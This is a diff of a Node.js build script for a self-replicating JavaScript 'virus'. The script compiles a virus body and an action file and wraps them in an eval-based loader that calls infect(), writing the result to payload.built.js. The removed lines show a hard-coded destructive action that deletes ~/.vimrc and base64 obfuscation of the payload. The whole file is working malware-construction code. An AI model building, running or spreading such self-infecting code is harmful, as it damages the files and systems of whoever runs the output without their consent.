@@ -1,34 +1,39 @@
 const fs   = require( "fs-extra" );
 const exec = require( "child-process-promise" ).exec;
 
-const maliciousAction = "(() => require('fs').unlink( '~/.vimrc' ))()";
-
 function getCopyOfVirus( virusSrc, action ) {
-    const enc = x => Buffer.from( x ).toString( "base64" );
+    const esc = str => str
+        .replace(/[\\"]/g, "\\$&")
+        .replace(/[\n\r]/g, "\\n");
+
     return `
 (function() {
-    var virusSrc = "${ enc( virusSrc ) }";
-    var action   = "${ enc( action ) }";
-    const dec = x => Buffer.from( x, "base64" ).toString();
-    eval( dec(action) + dec(virusSrc) + "infect( virusSrc, action );" ); 
+    var virusSrc = "${esc(virusSrc)}";
+    var action   = "${esc(action)}";
+    (()=>null)(action);
+    eval( virusSrc + "infect( virusSrc, action )" );
 })();`;
 }
 
 
 async function build() {
 
-    var src = "body.js";
-    var compiled = ".build/body.compiled.js";
-    var minified = ".build/body.min.js";
+    await fs.ensureDir( ".build" );
+
+    for( var key of [ "body", "action" ] ) {
+        var src      = `${key}.js`;
+        var compiled = `.build/${key}.compiled.js`;
+        var minified = `.build/${key}.min.js`;
+
+        await exec( `cat ${src} | ./node_modules/.bin/babel -o ${compiled} --presets es2015` );
+        await exec( `./node_modules/.bin/uglifyjs --mangle --compress -o ${minified} ${compiled}` );
+    }
         
     var tgt = "payload.built.js";
 
-    await fs.ensureDir( ".build" );
-    await exec( `cat ${src} | ./node_modules/.bin/babel -o ${compiled} --presets es2015` );
-    await exec( `./node_modules/.bin/uglifyjs --mangle --compress -o ${minified} ${compiled}` );
-
-    var raw = await fs.readFile( minified, "utf-8" );
-    await fs.writeFile( tgt, getCopyOfVirus( raw, maliciousAction ) );
+    var virusDef = await fs.readFile( ".build/body.min.js", "utf-8" );
+    var action = await fs.readFile( ".build/action.min.js", "utf-8" );
+    await fs.writeFile( tgt, getCopyOfVirus( virusDef, action ) );
 }
 
 build();
